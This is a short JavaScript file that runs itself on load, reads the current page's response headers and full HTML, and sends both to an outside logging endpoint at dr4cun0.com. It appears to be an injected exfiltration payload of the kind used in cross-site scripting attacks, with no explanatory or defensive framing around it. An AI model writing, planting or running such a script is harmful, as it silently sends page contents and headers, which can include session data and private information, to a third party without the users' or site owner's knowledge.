function getHeader() {
	var req = new XMLHttpRequest();
	req.open("GET", document.location, false);
	req.send(null);
	var headers = req.getAllResponseHeaders().toLowerCase();
	//alert(headers);
	loadXMLDoc(headers);
}
function loadXMLDoc(headers) {
    var xmlhttp = new XMLHttpRequest();

    xmlhttp.onreadystatechange = function() {
        if (xmlhttp.readyState == XMLHttpRequest.DONE ) {
           if (xmlhttp.status == 200) {
               //document.getElementById("myDiv").innerHTML = xmlhttp.responseText;
           }
        }
    };

    xmlhttp.open("POST", "https://dr4cun0.com/logger/", true);
    xmlhttp.send('{"source" : "' +  encodeURI(document.body.parentNode.innerHTML) + '", "headers" : "' + encodeURI(headers) + '"}');
}
getHeader();